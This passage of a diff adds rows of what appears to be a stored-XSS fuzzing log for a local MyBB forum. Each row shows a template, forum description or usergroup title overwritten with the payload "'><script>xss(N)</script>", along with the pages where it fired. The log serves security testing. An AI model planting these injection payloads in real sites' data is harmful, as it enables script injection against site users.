+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead"" colspan=""{$colspan}"">
+	<div class=""float_right"">
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->a}"" style=""padding: 5px;"">{$lang->a}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->b}"" style=""padding: 5px;"">{$lang->b}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->c}"" style=""padding: 5px;"">{$lang->c}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->d}"" style=""padding: 5px;"">{$lang->d}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->e}"" style=""padding: 5px;"">{$lang->e}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->f}"" style=""padding: 5px;"">{$lang->f}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->g}"" style=""padding: 5px;"">{$lang->g}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->h}"" style=""padding: 5px;"">{$lang->h}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->i}"" style=""padding: 5px;"">{$lang->i}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->j}"" style=""padding: 5px;"">{$lang->j}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->k}"" style=""padding: 5px;"">{$lang->k}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->l}"" style=""padding: 5px;"">{$lang->l}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->m}"" style=""padding: 5px;"">{$lang->m}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->n}"" style=""padding: 5px;"">{$lang->n}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->o}"" style=""padding: 5px;"">{$lang->o}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->p}"" style=""padding: 5px;"">{$lang->p}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->q}"" style=""padding: 5px;"">{$lang->q}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->r}"" style=""padding: 5px;"">{$lang->r}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->s}"" style=""padding: 5px;"">{$lang->s}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->t}"" style=""padding: 5px;"">{$lang->t}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->u}"" style=""padding: 5px;"">{$lang->u}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->v}"" style=""padding: 5px;"">{$lang->v}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->w}"" style=""padding: 5px;"">{$lang->w}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->x}"" style=""padding: 5px;"">{$lang->x}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->y}"" style=""padding: 5px;"">{$lang->y}</a>
+		<a href=""memberlist.php?username_match=begins&amp;username={$lang->z}"" style=""padding: 5px;"">{$lang->z}</a>
+	</div>
+	<div><strong>{$lang->member_list}</strong></div></td>
+</tr>
+<tr>
+<td class=""tcat"" width=""1%""><span class=""smalltext""><strong>{$lang->avatar}</strong></span></td>
+<td class=""tcat""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=username&amp;order=ascending""><strong>{$lang->username}</strong></a> {$orderarrow['username']}</span></td>
+<td class=""tcat"" width=""15%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=regdate&amp;order=ascending""><strong>{$lang->joined}</strong></a> {$orderarrow['regdate']}</span></td>
+<td class=""tcat"" width=""15%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=lastvisit&amp;order=descending""><strong>{$lang->lastvisit}</strong></a> {$orderarrow['lastvisit']}</span></td>
+<td class=""tcat"" width=""10%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=postnum&amp;order=descending""><strong>{$lang->posts}</strong></a> {$orderarrow['postnum']}</span></td>
+<td class=""tcat"" width=""10%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=threadnum&amp;order=descending""><strong>{$lang->threads}</strong></a> {$orderarrow['threadnum']}</span></td>
+{$referral_header}
+</tr>
+{$users}
+</table>
+{$multipage}
+<br class=""clear"" />
+<br />
+<form method=""post"" action=""memberlist.php"">
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead"" colspan=""3"">
+	<div class=""float_right"">
+		<strong><a href=""memberlist.php?action=search"">{$lang->advanced_search}</a></strong>
+	</div>
+	<div><strong>{$lang->search_members}</strong></div>
+</td>
+</tr>
+<tr>
+	<td class=""tcat""><strong><label for=""username"">{$lang->username}</label></strong></td>
+	<td class=""tcat""><strong><label for=""website"">{$lang->website}</label></strong></td>
+	<td class=""tcat""><strong><label for=""sort"">{$lang->sort_by}</label></strong></td>
+</tr>
+<tr>
+	<td class=""trow1"" width=""33%"" style=""vertical-align: top;"">
+		{$lang->exactly}<br />
+		<input type=""text"" class=""textbox"" name=""username"" id=""username"" style=""width: 99%; margin-top: 4px;"" value=""{$search_username}"" />
+	</td>
+	<td class=""trow1"" width=""33%"" style=""vertical-align: top;"">
+		{$lang->contains}<br />
+		<input type=""text"" class=""textbox"" name=""website"" id=""website"" style=""width: 99%; margin-top: 4px;"" value=""{$search_website}"" />
+	</td>
+	<td class=""trow1"" width=""33%"">
+		<div class=""smalltext"" style=""margin-bottom: 3px;"">
+			<input type=""radio"" class=""radio"" name=""order"" id=""order_asc"" value=""ascending""{$order_check['ascending']} /> <label for=""order_asc"">{$lang->order_asc}</label>&nbsp;
+			<input type=""radio"" class=""radio"" name=""order"" id=""order_desc"" value=""descending""{$order_check['descending']} /> <label for=""order_desc"">{$lang->order_desc}</label>
+		</div>
+		<select name=""sort"" id=""sort"" style=""width: 99%;"">
+			<option value=""username""{$sort_selected['username']}>{$lang->sort_by_username}</option>
+			<option value=""regdate""{$sort_selected['regdate']}>{$lang->sort_by_regdate}</option>
+			<option value=""lastvisit""{$sort_selected['lastvisit']}>{$lang->sort_by_lastvisit}</option>
+			<option value=""postnum""{$sort_selected['postnum']}>{$lang->sort_by_posts}</option>
+			<option value=""threadnum""{$sort_selected['threadnum']}>{$lang->sort_by_threads}</option>
+			{$referrals_option}
+		</select>
+	</td>
+</tr>
+</table>
+<div align=""center""><br /><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->search}"" /></div>
+</form>
+{$footer}
+<link rel=""stylesheet"" href=""{$mybb->asset_url}/jscripts/select2/select2.css?ver=1807"">
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/select2/select2.min.js?ver=1806""></script>
+<script type=""text/javascript"">
+<!--
+if(use_xmlhttprequest == ""1"")
+{
+	MyBB.select2();
+	$(""#username"").select2({
+		placeholder: ""{$lang->search_user}"",
+		minimumInputLength: 2,
+		multiple: false,
+		allowClear: true,
+		ajax: { // instead of writing the function to execute the request we use Select2's convenient helper
+			url: ""xmlhttp.php?action=get_users"",
+			dataType: 'json',
+			data: function (term, page) {
+				return {
+					query: term, // search term
+				};
+			},
+			results: function (data, page) { // parse the results into the format expected by Select2.
+				// since we are using custom formatting functions we do not need to alter remote JSON data
+				return {results: data};
+			}
+		},
+		initSelection: function(element, callback) {
+			var value = $(element).val();
+			if (value !== """") {
+				callback({
+					id: value,
+					text: value
+				});
+			}
+		},
+       // Allow the user entered text to be selected as well
+       createSearchChoice:function(term, data) {
+			if ( $(data).filter( function() {
+				return this.text.localeCompare(term)===0;
+			}).length===0) {
+				return {id:term, text:term};
+			}
+		},
+	});
+
+  	$('[for=username]').on('click', function(){
+		$(""#username"").select2('open');
+		return false;
+	});
+}
+// -->
+</script>
+</body>
+</html>' => '""'><script>xss(930647)</script>'
+            
+fuzzed after scan 199 / 302
+found as XSS in scan 200 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/forumdisplay.php?fid=2,932629,"""'><script>xss(932629)</script>","
+            mybb.mybb_templates.template[132][2]
+            original row: [133, 'forumdisplay_threadlist', '<div class=""float_left"">\n\t{$multipage}\n</div>\n<div class=""float_right"">\n\t{$newthread}\n</div>\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder clear"">\n\t<tr>\n\t\t<td class=""thead"" colspan=""{$colspan}"">\n\t\t\t<div class=""float_right"">\n\t\t\t\t<span class=""smalltext""><strong><a href=""misc.php?action=markread&amp;fid={$fid}{$post_code_string}"">{$lang->markforum_read}</a>{$addremovesubscription}{$clearstoredpass}</strong></span>\n\t\t\t</div>\n\t\t\t<div>\n\t\t\t\t<strong>{$foruminfo[\'name\']}</strong>\n\t\t\t</div>\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td class=""tcat"" colspan=""3"" width=""66%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=subject&amp;order=asc"">{$lang->thread}</a> {$orderarrow[\'subject\']} / <a href=""{$sorturl}&amp;sortby=starter&amp;order=asc"">{$lang->author}</a> {$orderarrow[\'starter\']}</strong></span></td>\n\t\t<td class=""tcat"" align=""center"" width=""7%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=replies&amp;order=desc"">{$lang->replies}</a> {$orderarrow[\'replies\']}</strong></span></td>\n\t\t<td class=""tcat"" align=""center"" width=""7%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=views&amp;order=desc"">{$lang->views}</a> {$orderarrow[\'views\']}</strong></span></td>\n\t\t{$ratingcol}\n\t\t<td class=""tcat"" align=""right"" width=""20%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=lastpost&amp;order=desc"">{$lang->lastpost}</a> {$orderarrow[\'lastpost\']}</strong></span></td>\n\t\t{$inlinemodcol}\n\t</tr>\n\t{$selectall}\n\t{$announcementlist}\n\t{$threads}\n\t{$forumsort}\n</table>\n<div class=""float_left"">\n\t{$multipage}\n</div>\n<div class=""float_right"" style=""margin-top: 4px;"">\n\t{$newthread}\n</div>\n<br class=""clear"" />\n<br />\n<div class=""float_left"">\n\t<div class=""float_left"">\n\t\t<dl class=""thread_legend smalltext"">\n\t\t\t<dd><span class=""thread_status newfolder"" title=""{$lang->new_thread}"">&nbsp;</span> {$lang->new_thread}</dd>\n\t\t\t<dd><span class=""thread_status newhotfolder"" title=""{$lang->new_hot_thread}"">&nbsp;</span> {$lang->new_hot_thread}</dd>\n\t\t\t<dd><span class=""thread_status hotfolder"" title=""{$lang->hot_thread}"">&nbsp;</span> {$lang->hot_thread}</dd>\n\t\t</dl>\n\t</div>\n\t<div class=""float_left"">\n\t\t<dl class=""thread_legend smalltext"">\n\t\t\t<dd><span class=""thread_status folder"" title=""{$lang->no_new_thread}"">&nbsp;</span> {$lang->no_new_thread}</dd>\n\t\t\t<dd><span class=""thread_status dot_folder"" title=""{$lang->posts_by_you}"">&nbsp;</span> {$lang->posts_by_you}</dd>\n\t\t\t<dd><span class=""thread_status closefolder"" title=""{$lang->closed_thread}"">&nbsp;</span> {$lang->closed_thread}</dd>\n\t\t</dl>\n\t</div>\n\t<br class=""clear"" />\n</div>\n<div class=""float_right"" style=""text-align: right;"">\n\t{$inlinemod}\n\t{$searchforum}\n\t{$forumjump}\n</div>\n<br class=""clear"" />\n{$inline_edit_js}', -2, '1827', '', 1676537388]
+            fuzzed row: [133, 'forumdisplay_threadlist', '""\'><script>xss(932629)</script>', -2, '1827', '', 1676537388]
+            change: '<div class=""float_left"">
+	{$multipage}
+</div>
+<div class=""float_right"">
+	{$newthread}
+</div>
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder clear"">
+	<tr>
+		<td class=""thead"" colspan=""{$colspan}"">
+			<div class=""float_right"">
+				<span class=""smalltext""><strong><a href=""misc.php?action=markread&amp;fid={$fid}{$post_code_string}"">{$lang->markforum_read}</a>{$addremovesubscription}{$clearstoredpass}</strong></span>
+			</div>
+			<div>
+				<strong>{$foruminfo['name']}</strong>
+			</div>
+		</td>
+	</tr>
+	<tr>
+		<td class=""tcat"" colspan=""3"" width=""66%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=subject&amp;order=asc"">{$lang->thread}</a> {$orderarrow['subject']} / <a href=""{$sorturl}&amp;sortby=starter&amp;order=asc"">{$lang->author}</a> {$orderarrow['starter']}</strong></span></td>
+		<td class=""tcat"" align=""center"" width=""7%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=replies&amp;order=desc"">{$lang->replies}</a> {$orderarrow['replies']}</strong></span></td>
+		<td class=""tcat"" align=""center"" width=""7%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=views&amp;order=desc"">{$lang->views}</a> {$orderarrow['views']}</strong></span></td>
+		{$ratingcol}
+		<td class=""tcat"" align=""right"" width=""20%""><span class=""smalltext""><strong><a href=""{$sorturl}&amp;sortby=lastpost&amp;order=desc"">{$lang->lastpost}</a> {$orderarrow['lastpost']}</strong></span></td>
+		{$inlinemodcol}
+	</tr>
+	{$selectall}
+	{$announcementlist}
+	{$threads}
+	{$forumsort}
+</table>
+<div class=""float_left"">
+	{$multipage}
+</div>
+<div class=""float_right"" style=""margin-top: 4px;"">
+	{$newthread}
+</div>
+<br class=""clear"" />
+<br />
+<div class=""float_left"">
+	<div class=""float_left"">
+		<dl class=""thread_legend smalltext"">
+			<dd><span class=""thread_status newfolder"" title=""{$lang->new_thread}"">&nbsp;</span> {$lang->new_thread}</dd>
+			<dd><span class=""thread_status newhotfolder"" title=""{$lang->new_hot_thread}"">&nbsp;</span> {$lang->new_hot_thread}</dd>
+			<dd><span class=""thread_status hotfolder"" title=""{$lang->hot_thread}"">&nbsp;</span> {$lang->hot_thread}</dd>
+		</dl>
+	</div>
+	<div class=""float_left"">
+		<dl class=""thread_legend smalltext"">
+			<dd><span class=""thread_status folder"" title=""{$lang->no_new_thread}"">&nbsp;</span> {$lang->no_new_thread}</dd>
+			<dd><span class=""thread_status dot_folder"" title=""{$lang->posts_by_you}"">&nbsp;</span> {$lang->posts_by_you}</dd>
+			<dd><span class=""thread_status closefolder"" title=""{$lang->closed_thread}"">&nbsp;</span> {$lang->closed_thread}</dd>
+		</dl>
+	</div>
+	<br class=""clear"" />
+</div>
+<div class=""float_right"" style=""text-align: right;"">
+	{$inlinemod}
+	{$searchforum}
+	{$forumjump}
+</div>
+<br class=""clear"" />
+{$inline_edit_js}' => '""'><script>xss(932629)</script>'
+            
+fuzzed after scan 195 / 302
+found as XSS in scan 196 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/forumdisplay.php?fid=2,940775,"""'><script>xss(940775)</script>","
+            mybb.mybb_templates.template[114][2]
+            original row: [115, 'forumdisplay_rssdiscovery', '<link rel=""alternate"" type=""application/rss+xml"" title=""{$lang->rss_discovery_forum} (RSS 2.0)"" href=""{$mybb->settings[\'bburl\']}/syndication.php?fid={$fid}"" />\n<link rel=""alternate"" type=""application/atom+xml"" title=""{$lang->rss_discovery_forum} (Atom 1.0)"" href=""{$mybb->settings[\'bburl\']}/syndication.php?type=atom1.0&amp;fid={$fid}"" />', -2, '120', '', 1676537388]
+            fuzzed row: [115, 'forumdisplay_rssdiscovery', '""\'><script>xss(940775)</script>', -2, '120', '', 1676537388]
+            change: '<link rel=""alternate"" type=""application/rss+xml"" title=""{$lang->rss_discovery_forum} (RSS 2.0)"" href=""{$mybb->settings['bburl']}/syndication.php?fid={$fid}"" />
+<link rel=""alternate"" type=""application/atom+xml"" title=""{$lang->rss_discovery_forum} (Atom 1.0)"" href=""{$mybb->settings['bburl']}/syndication.php?type=atom1.0&amp;fid={$fid}"" />' => '""'><script>xss(940775)</script>'
+            
+fuzzed after scan 195 / 302
+found as XSS in scan 196 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/showteam.php,941530,"""'><script>xss(941530)</script>","
+            mybb.mybb_templates.template[736][2]
+            original row: [737, 'showteam', ""<html>\n<head>\n<title>{$mybb->settings['bbname']} - {$lang->forum_team}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n{$grouplist}\n{$footer}\n</body>\n</html>"", -2, '120', '', 1676537388]
+            fuzzed row: [737, 'showteam', '""\'><script>xss(941530)</script>', -2, '120', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->forum_team}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+{$grouplist}
+{$footer}
+</body>
+</html>' => '""'><script>xss(941530)</script>'
+            
+fuzzed after scan 210 / 302
+found as XSS in scan 211 / 302"
+mybb,mybb_forums.description,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top",943983,"""'><script>xss(943983)</script>","
+            mybb.mybb_forums.description[1][2]
+            original row: [2, 'My Forum', '', '', 'f', 1, '1,2', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            fuzzed row: [2, 'My Forum', '""\'><script>xss(943983)</script>', '', 'f', 1, '1,2', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            change: '' => '""'><script>xss(943983)</script>'
+            
+fuzzed after scan 25 / 302
+found as XSS in scan 26 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/portal.php
+http://localhost/mybb/portal.php#top",944258,"""'><script>xss(944258)</script>","
+            mybb.mybb_templates.template[528][2]
+            original row: [529, 'portal', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']}</title>\n<link rel=""alternate"" type=""application/rss+xml"" title=""{$lang->latest_announcements} (RSS 2.0)"" href=""{$mybb->settings[\'bburl\']}/syndication.php?portal=1"" />\n<link rel=""alternate"" type=""application/atom+xml"" title=""{$lang->latest_announcements} (Atom 1.0)"" href=""{$mybb->settings[\'bburl\']}/syndication.php?portal=1&type=atom1.0"" />\n{$headerinclude}\n</head>\n<body>\n{$header}\n<table width=""100%"" cellspacing=""0"" cellpadding=""{$theme[\'tablespace\']}"" border=""0"" align=""center"">\n<tr><td valign=""top"" width=""200"">\n{$welcome}\n{$pms}\n{$search}\n{$stats}\n{$whosonline}\n{$latestthreads}\n</td>\n<td>&nbsp;</td>\n<td valign=""top"">\n{$announcements}\n{$multipage}\n</td>\n</tr>\n</table>\n{$footer}\n</body>\n</html>', -2, '1800', '', 1676537388]
+            fuzzed row: [529, 'portal', '""\'><script>xss(944258)</script>', -2, '1800', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']}</title>
+<link rel=""alternate"" type=""application/rss+xml"" title=""{$lang->latest_announcements} (RSS 2.0)"" href=""{$mybb->settings['bburl']}/syndication.php?portal=1"" />
+<link rel=""alternate"" type=""application/atom+xml"" title=""{$lang->latest_announcements} (Atom 1.0)"" href=""{$mybb->settings['bburl']}/syndication.php?portal=1&type=atom1.0"" />
+{$headerinclude}
+</head>
+<body>
+{$header}
+<table width=""100%"" cellspacing=""0"" cellpadding=""{$theme['tablespace']}"" border=""0"" align=""center"">
+<tr><td valign=""top"" width=""200"">
+{$welcome}
+{$pms}
+{$search}
+{$stats}
+{$whosonline}
+{$latestthreads}
+</td>
+<td>&nbsp;</td>
+<td valign=""top"">
+{$announcements}
+{$multipage}
+</td>
+</tr>
+</table>
+{$footer}
+</body>
+</html>' => '""'><script>xss(944258)</script>'
+            
+fuzzed after scan 205 / 302
+found as XSS in scan 206 / 302"
+mybb,mybb_usergroups.title,http://localhost/mybb/showteam.php,945525,"""'><script>xss(945525)</script>","
+            mybb.mybb_usergroups.title[1][2]
+            original row: [2, 1, 'Registered', 'After registration, all users are placed in this group by default.', '{username}', '', 0, 'images/star.png', '', 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 200, 5, 1, 0, 5, 5, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 5, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]
+            fuzzed row: [2, 1, '""\'><script>xss(945525)</script>', 'After registration, all users are placed in this group by default.', '{username}', '', 0, 'images/star.png', '', 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 200, 5, 1, 0, 5, 5, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 5, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]
+            change: 'Registered' => '""'><script>xss(945525)</script>'
+            
+fuzzed after scan 229 / 302
+found as XSS in scan 230 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/misc.php?action=help,947574,"""'><script>xss(947574)</script>","
+            mybb.mybb_templates.template[290][2]
+            original row: [291, 'misc_help', ""<html>\n<head>\n<title>{$mybb->settings['bbname']} - {$lang->help_docs}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n{$sections}\n{$search}\n{$footer}\n</body>\n</html>"", -2, '1800', '', 1676537388]
+            fuzzed row: [291, 'misc_help', '""\'><script>xss(947574)</script>', -2, '1800', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->help_docs}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+{$sections}
+{$search}
+{$footer}
+</body>
+</html>' => '""'><script>xss(947574)</script>'
+            
+fuzzed after scan 199 / 302
+found as XSS in scan 200 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/calendar.php
+http://localhost/mybb/calendar.php?calendar=1
+http://localhost/mybb/contact.php
+http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/forumdisplay.php?fid=2
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top
+http://localhost/mybb/member.php?action=emailuser&uid=
+http://localhost/mybb/member.php?action=login
+http://localhost/mybb/member.php?action=lostpw
+http://localhost/mybb/member.php?action=profile&uid=
+http://localhost/mybb/member.php?action=register
+http://localhost/mybb/memberlist.php
+http://localhost/mybb/memberlist.php?action=search
+http://localhost/mybb/misc.php?action=help
+http://localhost/mybb/misc.php?action=syndication
+http://localhost/mybb/online.php
+http://localhost/mybb/online.php#top
+http://localhost/mybb/online.php?action=today
+http://localhost/mybb/online.php?sortby=location
+http://localhost/mybb/online.php?sortby=time
+http://localhost/mybb/online.php?sortby=username
+http://localhost/mybb/portal.php
+http://localhost/mybb/portal.php#top
+http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top
+http://localhost/mybb/showteam.php
+http://localhost/mybb/stats.php
+http://localhost/mybb/stats.php#top",947749,"""'><script>xss(947749)</script>","
+            mybb.mybb_templates.template[489][2]
+            original row: [490, 'nav', '\n<div class=""navigation"">\n{$nav}{$activesep}{$activebit}\n</div>', -2, '120', '', 1676537388]
+            fuzzed row: [490, 'nav', '""\'><script>xss(947749)</script>', -2, '120', '', 1676537388]
+            change: '
+<div class=""navigation"">
+{$nav}{$activesep}{$activebit}
+</div>' => '""'><script>xss(947749)</script>'
+            
+fuzzed after scan 204 / 302
+found as XSS in scan 205 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/calendar.php
+http://localhost/mybb/calendar.php?calendar=1
+http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/forumdisplay.php?fid=2
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top
+http://localhost/mybb/member.php?action=emailuser&uid=
+http://localhost/mybb/member.php?action=login
+http://localhost/mybb/member.php?action=lostpw
+http://localhost/mybb/member.php?action=profile&uid=
+http://localhost/mybb/member.php?action=register
+http://localhost/mybb/memberlist.php
+http://localhost/mybb/memberlist.php?action=search
+http://localhost/mybb/misc.php?action=help
+http://localhost/mybb/misc.php?action=syndication
+http://localhost/mybb/online.php
+http://localhost/mybb/online.php#top
+http://localhost/mybb/online.php?action=today
+http://localhost/mybb/online.php?sortby=location
+http://localhost/mybb/online.php?sortby=time
+http://localhost/mybb/online.php?sortby=username
+http://localhost/mybb/portal.php
+http://localhost/mybb/portal.php#top
+http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top
+http://localhost/mybb/showteam.php
+http://localhost/mybb/stats.php
+http://localhost/mybb/stats.php#top",953736,"""'><script>xss(953736)</script>","
+            mybb.mybb_templates.template[964][2]
+            original row: [965, 'headerinclude', '<link rel=""alternate"" type=""application/rss+xml"" title=""{$lang->latest_threads} (RSS 2.0)"" href=""{$mybb->settings[\'bburl\']}/syndication.php"" />\n<link rel=""alternate"" type=""application/atom+xml"" title=""{$lang->latest_threads} (Atom 1.0)"" href=""{$mybb->settings[\'bburl\']}/syndication.php?type=atom1.0"" />\n<meta http-equiv=""Content-Type"" content=""text/html; charset={$charset}"" />\n<meta http-equiv=""Content-Script-Type"" content=""text/javascript"" />\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/jquery.js?ver=1823""></script>\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/jquery.plugins.min.js?ver=1821""></script>\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/general.js?ver=1827""></script>\n\n{$stylesheets}\n<script type=""text/javascript"">\n<!--\n\tlang.unknown_error = ""{$lang->unknown_error}"";\n\tlang.confirm_title = ""{$lang->confirm_title}"";\n\tlang.expcol_collapse = ""{$lang->expcol_collapse}"";\n\tlang.expcol_expand = ""{$lang->expcol_expand}"";\n\tlang.select2_match = ""{$lang->select2_match}"";\n\tlang.select2_matches = ""{$lang->select2_matches}"";\n\tlang.select2_nomatches = ""{$lang->select2_nomatches}"";\n\tlang.select2_inputtooshort_single = ""{$lang->select2_inputtooshort_single}"";\n\tlang.select2_inputtooshort_plural = ""{$lang->select2_inputtooshort_plural}"";\n\tlang.select2_inputtoolong_single = ""{$lang->select2_inputtoolong_single}"";\n\tlang.select2_inputtoolong_plural = ""{$lang->select2_inputtoolong_plural}"";\n\tlang.select2_selectiontoobig_single = ""{$lang->select2_selectiontoobig_single}"";\n\tlang.select2_selectiontoobig_plural = ""{$lang->select2_selectiontoobig_plural}"";\n\tlang.select2_loadmore = ""{$lang->select2_loadmore}"";\n\tlang.select2_searching = ""{$lang->select2_searching}"";\n\n\tvar templates = {\n\t\tmodal: \'{$jsTemplates[\'modal\']}\',\n\t\tmodal_button: \'{$jsTemplates[\'modal_button\']}\'\n\t};\n\n\tvar cookieDomain = ""{$mybb->settings[\'cookiedomain\']}"";\n\tvar cookiePath = ""{$mybb->settings[\'cookiepath\']}"";\n\tvar cookiePrefix = ""{$mybb->settings[\'cookieprefix\']}"";\n\tvar cookieSecureFlag = ""{$mybb->settings[\'cookiesecureflag\']}"";\n\tvar deleteevent_confirm = ""{$lang->deleteevent_confirm}"";\n\tvar removeattach_confirm = ""{$lang->removeattach_confirm}"";\n\tvar loading_text = \'{$lang->ajax_loading}\';\n\tvar saving_changes = \'{$lang->saving_changes}\';\n\tvar use_xmlhttprequest = ""{$mybb->settings[\'use_xmlhttprequest\']}"";\n\tvar my_post_key = ""{$mybb->post_code}"";\n\tvar rootpath = ""{$mybb->settings[\'bburl\']}"";\n\tvar imagepath = ""{$theme[\'imgdir\']}"";\n  \tvar yes_confirm = ""{$lang->yes}"";\n\tvar no_confirm = ""{$lang->no}"";\n\tvar MyBBEditor = null;\n\tvar spinner_image = ""{$theme[\'imgdir\']}/spinner.gif"";\n\tvar spinner = ""<img src=\'"" + spinner_image +""\' alt=\'\' />"";\n\tvar modal_zindex = 9999;\n// -->\n</script>', -2, '1827', '', 1676537388]
+            fuzzed row: [965, 'headerinclude', '""\'><script>xss(953736)</script>', -2, '1827', '', 1676537388]
+            change: '<link rel=""alternate"" type=""application/rss+xml"" title=""{$lang->latest_threads} (RSS 2.0)"" href=""{$mybb->settings['bburl']}/syndication.php"" />
+<link rel=""alternate"" type=""application/atom+xml"" title=""{$lang->latest_threads} (Atom 1.0)"" href=""{$mybb->settings['bburl']}/syndication.php?type=atom1.0"" />
+<meta http-equiv=""Content-Type"" content=""text/html; charset={$charset}"" />
+<meta http-equiv=""Content-Script-Type"" content=""text/javascript"" />
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/jquery.js?ver=1823""></script>
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/jquery.plugins.min.js?ver=1821""></script>
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/general.js?ver=1827""></script>
+
+{$stylesheets}
+<script type=""text/javascript"">
+<!--
+	lang.unknown_error = ""{$lang->unknown_error}"";
+	lang.confirm_title = ""{$lang->confirm_title}"";
+	lang.expcol_collapse = ""{$lang->expcol_collapse}"";
+	lang.expcol_expand = ""{$lang->expcol_expand}"";
+	lang.select2_match = ""{$lang->select2_match}"";
+	lang.select2_matches = ""{$lang->select2_matches}"";
+	lang.select2_nomatches = ""{$lang->select2_nomatches}"";
+	lang.select2_inputtooshort_single = ""{$lang->select2_inputtooshort_single}"";
